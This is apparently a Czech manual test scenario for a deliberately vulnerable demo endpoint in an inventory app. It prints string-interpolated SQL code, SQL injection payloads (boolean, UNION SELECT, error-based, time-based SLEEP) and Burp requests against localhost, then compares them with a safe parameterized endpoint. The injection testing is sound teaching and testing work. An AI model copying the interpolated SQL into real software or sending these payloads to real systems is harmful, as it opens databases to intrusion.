# Manual scenario: Inventory movements SQL Injection

Datum ověření: 2026-10-06

## Účel scénáře

Scénář demonstruje SQL Injection v aplikační demo větvi pro výpis skladových pohybů. Nejde o SQLi Lab, ale o běžný API endpoint modelové aplikace, který má záměrně zranitelnou variantu oddělenou od bezpečného endpointu.

## Kontext

Zranitelný endpoint:

```text
GET /api/demo/inventory-movements
```

Bezpečný endpoint pro porovnání:

```text
GET /api/inventory-movements
```

Zranitelný endpoint:

- vyžaduje JWT token,
- vyžaduje roli `admin`,
- je dostupný pouze při `DEMO_VULN=true`,
- při `DEMO_VULN=false` vrací po autentizaci `404`,
- vrací JSON ve tvaru `{ "movements": [...] }`.

Bezpečný endpoint:

- vyžaduje JWT token,
- nevyžaduje admin roli,
- validuje vstupy přes Joi,
- používá parametrizovaný SQL dotaz,
- vrací JSON ve tvaru `{ "movements": [...], "limit": 50, "offset": 0 }`.

Testovaný parametr pro hlavní scénáře: `type`.

Další zranitelné parametry v demo větvi podle kódu: `variant_id`, `user_id`, `date_from`, `date_to`, `note`, `sort`, `dir`, `limit`, `offset`.

Skutečné JWT tokeny jsou v dokumentaci vždy redigované jako `<jwt_token>`.

## Implementační místo

Relevantní soubory:

```text
backend/src/index.js
backend/src/routes/movements.js
backend/src/routes/demoMovements.js
backend/src/controllers/inventoryMovementsController.js
backend/src/dao/inventoryMovementsDao.js
```

Mountování rout:

```js
app.use('/api/inventory-movements', movementsRoutes); // SAFE
app.use('/api/demo', demoMovementsRoutes); // VULN
```

Bezpečný endpoint:

```js
router.get('/', authMiddleware, inventoryMovementsController.listMovements);
```

Demo endpoint:

```js
router.get(
  '/inventory-movements',
  authMiddleware,
  requireDemoVuln,
  requireRole('admin'),
  inventoryMovementsController.listMovementsVuln
);
```

Kontrola `DEMO_VULN`:

```js
function requireDemoVuln(req, res, next) {
  if (process.env.DEMO_VULN !== 'true') {
    return res.status(404).json({ error: 'Not found' });
  }
  next();
}
```

Bezpečná validace query parametrů:

```js
const listSchema = Joi.object({
  variant_id: Joi.number().integer().min(1).optional(),
  type: Joi.string().valid('IN', 'OUT', 'ADJUST').optional(),
  note: Joi.string().allow('', null).optional(),
  limit: Joi.number().integer().min(1).max(200).optional(),
  offset: Joi.number().integer().min(0).optional(),
});
```

Volná validace v demo větvi:

```js
const vulnListSchema = Joi.object({
  variant_id: Joi.string().optional(),
  type: Joi.string().optional(),
  note: Joi.string().optional(),
  user_id: Joi.string().optional(),
  date_from: Joi.string().optional(),
  date_to: Joi.string().optional(),
  sort: Joi.string().optional(),
  dir: Joi.string().optional(),
  limit: Joi.string().optional(),
  offset: Joi.string().optional(),
}).unknown(true);
```

Bezpečný SQL dotaz používá placeholdery a parametry:

```js
const sql = `
  SELECT
    m.id, m.variant_id, m.user_id, m.type, m.quantity, m.note, m.created_at,
    u.name AS user_name,
    v.sku, v.variant_name
  FROM inventory_movements m
  JOIN users u ON u.id = m.user_id
  JOIN item_variants v ON v.id = m.variant_id
  WHERE (? IS NULL OR m.variant_id = ?)
    AND (? IS NULL OR m.type = ?)
    AND (? IS NULL OR m.note LIKE ?)
  ORDER BY m.created_at DESC
  LIMIT ? OFFSET ?;
`;

const [rows] = await pool.query(sql, params);
```

Zranitelný SQL dotaz skládá vstupy přímo do SQL řetězce:

```js
const where = `
  WHERE 1=1
    ${variantId ? `AND m.variant_id = ${variantId}` : ''}
    ${type ? `AND m.type = '${type}'` : ''}
    ${userId ? `AND m.user_id = ${userId}` : ''}
    ${dateFrom ? `AND m.created_at >= '${dateFrom}'` : ''}
    ${dateTo ? `AND m.created_at <= '${dateTo}'` : ''}
    ${note ? `AND m.note LIKE '%${note}%'` : ''}
`;

const order = `ORDER BY ${sort || 'created_at'} ${dir || 'DESC'}`;
const page = `LIMIT ${limit || 50} OFFSET ${offset || 0}`;
```

Původní `SELECT` ve zranitelné větvi vrací 10 sloupců:

```text
m.id
m.variant_id
m.user_id
m.type
m.quantity
m.note
m.created_at
u.name AS user_name
v.sku
v.variant_name
```

Funkční `UNION SELECT` proto musí vracet 10 kompatibilních sloupců.

## Testovací požadavky

### A. Dostupnost endpointu při DEMO_VULN=false

Význam: ověřit, že demo endpoint není dostupný bez explicitního zapnutí zranitelné větve.

```http
GET /api/demo/inventory-movements?type=IN&limit=20&offset=0
Authorization: Bearer <jwt_token>
```

### B. Legitimní vstup

Význam: ověřit běžné filtrování podle typu skladového pohybu.

```http
GET /api/demo/inventory-movements?type=IN&limit=100&offset=0
Authorization: Bearer <jwt_token>
```

### C. Rušivý vstup

Význam: ověřit, zda jednoduché narušení SQL syntaxe vyvolá databázovou chybu.

```text
type=IN'
```

### D. Boolean-based potvrzení

Význam: porovnat pravdivou a nepravdivou podmínku bez potřeby vracet cizí data.

```text
type=IN' AND 1=0 -- 
type=IN' OR 1=1 -- 
```

### E. UNION-based demonstrace

Význam: připojit kontrolovaný řádek do odpovědi bez čtení citlivých dat.

```text
type=NOPE' UNION SELECT 999001,1,1,'IN',1,'UNION_ROW',NOW(),'Union User','UNION-SKU','Union Variant' -- 
```

### F. Error-based demonstrace

Význam: vyvolat kontrolovanou databázovou chybu.

```text
type=IN' AND not_a_column = 1 -- 
```

Doplňkově byl ověřen i zranitelný parametr `sort`:

```text
sort=missing_demo_column&dir=ASC
```

### G. Time-based demonstrace

Význam: ověřit časové zpoždění opatrně a pouze nad omezeným počtem řádků.

Použit byl také filtr `variant_id=1`, aby se `SLEEP(1)` nespouštěl nad větším počtem řádků.

```text
variant_id=1&type=IN' AND IF(1=1,SLEEP(1),0) -- 
variant_id=1&type=IN' AND IF(1=0,SLEEP(1),0) -- 
```

### H. Porovnání se safe variantou

Hlavní payloady byly odeslány také proti:

```text
GET /api/inventory-movements
```

Cílem bylo ověřit, zda bezpečná varianta payload odmítne validací nebo zpracuje bezpečně bez změny SQL logiky.

## Reprodukce v Burp Suite

Stručný postup:

1. Spustit backend s `DEMO_VULN=true`.
2. Přihlásit se jako admin přes aplikaci nebo přes `POST /api/auth/login`.
3. Získaný JWT token vložit do hlavičky `Authorization`.
4. Otevřít Burp Suite.
5. Použít Burp Browser nebo nastavit proxy v prohlížeči.
6. Zachytit request na `GET /api/demo/inventory-movements`.
7. Poslat request do Repeateru.
8. V Repeateru měnit hlavně parametr `type`, případně `sort`.
9. Porovnat odpovědi demo endpointu s bezpečným endpointem `/api/inventory-movements`.

Raw HTTP request pro hlavní UNION payload:

```http
GET /api/demo/inventory-movements?type=NOPE%27%20UNION%20SELECT%20999001%2C1%2C1%2C%27IN%27%2C1%2C%27UNION_ROW%27%2CNOW%28%29%2C%27Union%20User%27%2C%27UNION-SKU%27%2C%27Union%20Variant%27%20--%20&limit=100 HTTP/1.1
Host: 127.0.0.1:4000
Authorization: Bearer <jwt_token>
Connection: close
```

Safe porovnání:

```http
GET /api/inventory-movements?type=NOPE%27%20UNION%20SELECT%20999001%2C1%2C1%2C%27IN%27%2C1%2C%27UNION_ROW%27%2CNOW%28%29%2C%27Union%20User%27%2C%27UNION-SKU%27%2C%27Union%20Variant%27%20--%20&limit=100 HTTP/1.1
Host: 127.0.0.1:4000
Authorization: Bearer <jwt_token>
Connection: close
```

## Naměřené výsledky

Test byl spuštěn proti lokálnímu backendu:

```text
http://127.0.0.1:4000
```

Krok A byl ověřen na odděleném lokálním portu s `DEMO_VULN=false`. Ostatní kroky byly ověřeny proti běžícímu backendu s `DEMO_VULN=true`.

| Testovací krok | Endpoint | Parametr/payload | HTTP status | rowCount | error | Pozorovaný výsledek |
| --- | --- | --- | ---: | ---: | --- | --- |
| A - `DEMO_VULN=false` | `/api/demo/inventory-movements` | `type=IN` | 404 | N/A | `Not found` | Demo endpoint není dostupný, i když je použit admin token. |
| Boundary - bez tokenu | `/api/demo/inventory-movements` | `type=IN` | 401 | N/A | `Unauthorized` | Endpoint vyžaduje autentizaci. |
| Boundary - běžný user | `/api/demo/inventory-movements` | `type=IN` | 403 | N/A | `Forbidden: insufficient privileges` | Endpoint vyžaduje admin roli. |
| B - legitimní demo vstup | `/api/demo/inventory-movements` | `type=IN` | 200 | 6 | `null` | Demo endpoint vrátil seedované `IN` pohyby. |
| B-safe - legitimní safe vstup | `/api/inventory-movements` | `type=IN` | 200 | 6 | `null` | Safe endpoint vrátil stejné legitimní výsledky a navíc `limit`, `offset`. |
| C - rušivý vstup | `/api/demo/inventory-movements` | `type=IN'` | 500 | N/A | SQL syntax error | Přímá interpolace rozbila SQL syntaxi. |
| C-safe - rušivý vstup | `/api/inventory-movements` | `type=IN'` | 400 | N/A | `"type" must be one of [IN, OUT, ADJUST]` | Safe endpoint payload odmítl validací. |
| D1 - boolean false | `/api/demo/inventory-movements` | `type=IN' AND 1=0 -- ` | 200 | 0 | `null` | Nepravdivá podmínka vrátila prázdnou množinu. |
| D2 - boolean true | `/api/demo/inventory-movements` | `type=IN' OR 1=1 -- ` | 200 | 10 | `null` | Pravdivá podmínka rozšířila výsledek z 6 na 10 řádků. |
| D-safe - boolean true | `/api/inventory-movements` | `type=IN' OR 1=1 -- ` | 400 | N/A | `"type" must be one of [IN, OUT, ADJUST]` | Safe endpoint payload odmítl. |
| E - UNION konstanty | `/api/demo/inventory-movements` | `type=NOPE' UNION SELECT ...` | 200 | 1 | `null` | Odpověď obsahovala kontrolovaný řádek `UNION_ROW` / `UNION-SKU`. |
| E-safe - UNION konstanty | `/api/inventory-movements` | `type=NOPE' UNION SELECT ...` | 400 | N/A | `"type" must be one of [IN, OUT, ADJUST]` | Safe endpoint payload odmítl. |
| F - error not_a_column | `/api/demo/inventory-movements` | `type=IN' AND not_a_column = 1 -- ` | 500 | N/A | `Unknown column 'not_a_column' in 'where clause'` | Demo endpoint vrátil kontrolovanou DB chybu. |
| F-sort - error sort | `/api/demo/inventory-movements` | `sort=missing_demo_column&dir=ASC` | 500 | N/A | `Unknown column 'missing_demo_column' in 'order clause'` | Potvrzeno, že zranitelný je i `sort`. |
| F-safe - error payload | `/api/inventory-movements` | `type=IN' AND not_a_column = 1 -- ` | 400 | N/A | `"type" must be one of [IN, OUT, ADJUST]` | Safe endpoint payload odmítl. |
| G1 - time true | `/api/demo/inventory-movements` | `variant_id=1&type=IN' AND IF(1=1,SLEEP(1),0) -- ` | 200 | 0 | `null` | Odezva trvala `1011 ms`, tedy odpovídá `SLEEP(1)`. |
| G2 - time false | `/api/demo/inventory-movements` | `variant_id=1&type=IN' AND IF(1=0,SLEEP(1),0) -- ` | 200 | 0 | `null` | Odezva trvala `6 ms`, tedy bez umělého zpoždění. |
| G-safe - time true | `/api/inventory-movements` | `variant_id=1&type=IN' AND IF(1=1,SLEEP(1),0) -- ` | 400 | N/A | `"type" must be one of [IN, OUT, ADJUST]` | Safe endpoint payload odmítl. |

## Ukázky odpovědí

### B. Legitimní demo vstup

```json
{
  "movements": [
    {
      "id": 10,
      "variant_id": 7,
      "user_id": 1,
      "type": "IN",
      "quantity": 2,
      "note": "[SEED] SQLi lab low-stock row.",
      "created_at": "2026-06-24T10:15:00.000Z",
      "user_name": "Admin",
      "sku": "SQLI-LOWSTOCK",
      "variant_name": "Low Stock Lab Row"
    }
  ]
}
```

### D2. Boolean true

```json
{
  "movements": [
    {
      "id": 10,
      "type": "IN",
      "note": "[SEED] SQLi lab low-stock row.",
      "sku": "SQLI-LOWSTOCK"
    },
    {
      "id": 8,
      "type": "OUT",
      "note": "[SEED] Bulk cable outbound movement.",
      "sku": "USB-C-1M"
    }
  ]
}
```

Poznámka: v odpovědi se objevují i řádky s `type=OUT`, což potvrzuje změnu logiky původního filtru `type=IN`.

### E. UNION-based demonstrace

```json
{
  "movements": [
    {
      "id": 999001,
      "variant_id": 1,
      "user_id": 1,
      "type": "IN",
      "quantity": 1,
      "note": "UNION_ROW",
      "created_at": "2026-07-07T18:22:49.000Z",
      "user_name": "Union User",
      "sku": "UNION-SKU",
      "variant_name": "Union Variant"
    }
  ]
}
```

### F. Error-based demonstrace

```json
{
  "error": "Unknown column 'not_a_column' in 'where clause'"
}
```

### H. Safe endpoint se stejným UNION payloadem

```json
{
  "error": "\"type\" must be one of [IN, OUT, ADJUST]"
}
```

## Závěr pro scénář

Legitimní vstup `type=IN` potvrdil, že demo endpoint vrací běžná seedovaná data a bezpečný endpoint poskytuje srovnatelný legitimní výsledek.

Rušivý vstup `type=IN'` vyvolal ve zranitelné větvi SQL syntax error, zatímco bezpečný endpoint stejný vstup odmítl validací.

Boolean-based dvojice payloadů potvrdila změnu SQL logiky. Nepravdivá podmínka vrátila `0` řádků, zatímco pravdivá podmínka vrátila `10` řádků a zahrnula i pohyby s jiným typem než `IN`.

Hlavním důkazem exploitace je UNION payload:

```text
NOPE' UNION SELECT 999001,1,1,'IN',1,'UNION_ROW',NOW(),'Union User','UNION-SKU','Union Variant' -- 
```

Payload vrátil kontrolovaný syntetický řádek přímo v JSON odpovědi. To potvrzuje, že vstup v parametru `type` nebyl zpracován jako datová hodnota, ale stal se součástí SQL syntaxe.

Error-based payload `type=IN' AND not_a_column = 1 -- ` vrátil kontrolovanou databázovou chybu. Doplňkově se ukázalo, že zranitelný je také `sort`, protože `sort=missing_demo_column` vedl k chybě v `ORDER BY`.

Time-based payload byl proveden opatrně s omezením `variant_id=1`. TRUE varianta měla odezvu přibližně `1011 ms`, FALSE varianta `6 ms`. Tento krok je doplňkový; hlavním důkazem scénáře zůstává boolean/UNION demonstrace.

Bezpečný endpoint `/api/inventory-movements` hlavní payloady odmítl validací `type`, nepřipojil žádná data přes UNION, nerozšířil výsledky a nevyvolal databázové chyby. Scénář tak jasně ukazuje rozdíl mezi zranitelným skládáním SQL řetězce a bezpečnou validací společně s parametrizovaným dotazem.
